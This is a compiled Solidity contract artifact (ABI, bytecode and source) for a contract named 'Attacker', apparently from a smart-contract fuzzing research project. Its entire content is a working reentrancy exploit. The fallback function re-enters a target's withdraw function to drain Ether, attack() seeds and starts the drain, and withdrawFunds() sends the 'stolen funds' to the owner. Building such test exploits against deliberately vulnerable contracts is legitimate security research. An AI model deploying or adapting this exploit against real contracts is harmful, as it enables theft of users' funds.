{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "drainedAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "prevBalanceVulnerableContract",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "targetAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalWithdraw",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract VulnerableContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_targetAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x6080604052600060055534801561001557600080fd5b50604051610bb5380380610bb5833981810160405281019061003791906100d4565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610146565b6000815190506100ce8161012f565b92915050565b6000602082840312156100e657600080fd5b60006100f4848285016100bf565b91505092915050565b60006101088261010f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610138816100fd565b811461014357600080fd5b50565b610a60806101556000396000f3fe6080604052600436106100955760003560e01c80638467006211610059578063846700621461024d5780638da5cb5b14610278578063953b8fb8146102a3578063d0e30db0146102ce578063f66ad59a146102d857610096565b80630f5ea8271461018757806324600fc3146101b257806327e235e3146101c9578063455fd6231461020657806364dd891a1461023157610096565b5b600354600654111580156100ae575060055460065411155b156101855760055460065414156100cd576005546006819055506100e9565b600454600660008282546100e19190610917565b925050819055505b6000600454111561018457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6004546040518263ffffffff1660e01b815260040161015191906108eb565b600060405180830381600087803b15801561016b57600080fd5b505af115801561017f573d6000803e3d6000fd5b505050505b5b005b34801561019357600080fd5b5061019c610303565b6040516101a991906108eb565b60405180910390f35b3480156101be57600080fd5b506101c7610309565b005b3480156101d557600080fd5b506101f060048036038101906101eb91906106ca565b610404565b6040516101fd91906108eb565b60405180910390f35b34801561021257600080fd5b5061021b61041c565b60405161022891906108eb565b60405180910390f35b61024b600480360381019061024691906106f3565b610422565b005b34801561025957600080fd5b50610262610646565b60405161026f91906108eb565b60405180910390f35b34801561028457600080fd5b5061028d61064c565b60405161029a9190610855565b60405180910390f35b3480156102af57600080fd5b506102b8610672565b6040516102c591906108eb565b60405180910390f35b6102d6610678565b005b3480156102e457600080fd5b506102ed61067a565b6040516102fa9190610870565b60405180910390f35b60045481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610399576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103909061088b565b60405180910390fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610401573d6000803e3d6000fd5b50565b60006020528060005260406000206000915090505481565b60065481565b803410610464576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161045b906108ab565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16318111156104e0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104d7906108cb565b60405180910390fd5b80600381905550346006819055600481905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561055d57600080fd5b505af1158015610571573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631600581905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b815260040161061191906108eb565b600060405180830381600087803b15801561062b57600080fd5b505af115801561063f573d6000803e3d6000fd5b5050505050565b60055481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000813590506106af816109fc565b92915050565b6000813590506106c481610a13565b92915050565b6000602082840312156106dc57600080fd5b60006106ea848285016106a0565b91505092915050565b60006020828403121561070557600080fd5b6000610713848285016106b5565b91505092915050565b6107258161096d565b82525050565b610734816109a9565b82525050565b6000610747601783610906565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b6000610787603983610906565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b206c657373207468616e2074617267657420616d6f756e74000000000000006020830152604082019050919050565b60006107ed603e83610906565b91507f54617267657420616d6f756e74206d757374206265206c657373207468616e2060008301527f62616c616e6365206f662076756c6e657261626c6520636f6e747261637400006020830152604082019050919050565b61084f8161099f565b82525050565b600060208201905061086a600083018461071c565b92915050565b6000602082019050610885600083018461072b565b92915050565b600060208201905081810360008301526108a48161073a565b9050919050565b600060208201905081810360008301526108c48161077a565b9050919050565b600060208201905081810360008301526108e4816107e0565b9050919050565b60006020820190506109006000830184610846565b92915050565b600082825260208201905092915050565b60006109228261099f565b915061092d8361099f565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610962576109616109cd565b5b828201905092915050565b60006109788261097f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006109b4826109bb565b9050919050565b60006109c68261097f565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b610a058161096d565b8114610a1057600080fd5b50565b610a1c8161099f565b8114610a2757600080fd5b5056fea2646970667358221220670ef1df8a8cba4d60d744512309a66b167ee46413bb8db3369db7360ace4f4764736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./VulnerableContract.sol\";\r\n\r\ncontract Attacker {\r\n    mapping(address => uint256) public balances;\r\n    VulnerableContract public vulnerable;\r\n    address public owner;\r\n    uint256 public targetAmount;  // Amount to drain\r\n    uint256 public drainedAmount;  // Amount already drained\r\n    uint256 public prevBalanceVulnerableContract=0;  // Amount to drain\r\n    uint256 public totalWithdraw; //targetAmount - drainedAmount;\r\n\r\n    constructor(address payable _vulnerableAddress) {\r\n        vulnerable = VulnerableContract(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function for reentrancy\r\n    fallback() external payable {\r\n        //uint256 vulnBalance = prevBalanceVulnerableContract; //address(vulnerable).balance;\r\n        \r\n       // uint256 attackBalance = address(this).balance;\r\n        if (totalWithdraw <= targetAmount && totalWithdraw <= prevBalanceVulnerableContract) {\r\n            \r\n            \r\n            if (totalWithdraw == prevBalanceVulnerableContract) {\r\n                totalWithdraw = prevBalanceVulnerableContract;  // Cap withdrawal to remaining balance\r\n            } else {\r\n                totalWithdraw += drainedAmount;\r\n            }\r\n            //drainedAmount += amountToWithdraw;\r\n            \r\n            //prevBalanceVulnerableContract -= drainedAmount;\r\n            if (drainedAmount>0) {\r\n                vulnerable.withdraw(drainedAmount);\r\n              }  // Reenter to withdraw\r\n            \r\n        }\r\n    }\r\n\r\n    // Initiate the attack with a specific target amount\r\n    function attack(uint256 _targetAmount) external payable {\r\n        \r\n        require(msg.value < _targetAmount, \"Need to send some Ether to attack less than target amount\");\r\n        require(_targetAmount <= address(vulnerable).balance, \"Target amount must be less than balance of vulnerable contract\");\r\n        \r\n        targetAmount = _targetAmount;\r\n        drainedAmount = totalWithdraw = msg.value;\r\n        \r\n\r\n        // Deposit initial amount to vulnerable contract\r\n        vulnerable.deposit{value: msg.value}();\r\n\r\n        prevBalanceVulnerableContract = address(vulnerable).balance;\r\n\r\n        // Start reentrancy attack with the initial deposit\r\n        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit\r\n    }\r\n\r\n    // Withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n     // Function to allow the contract to receive Ether\r\n    function deposit() external payable {\r\n        // Function to handle incoming Ether\r\n    }\r\n   \r\n}\r\n",
  "sourcePath": "c:\\Users\\andri\\dev\\github\\smartcontractdrlfuz\\env1_dev2\\contracts\\Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-24T16:33:22.030Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}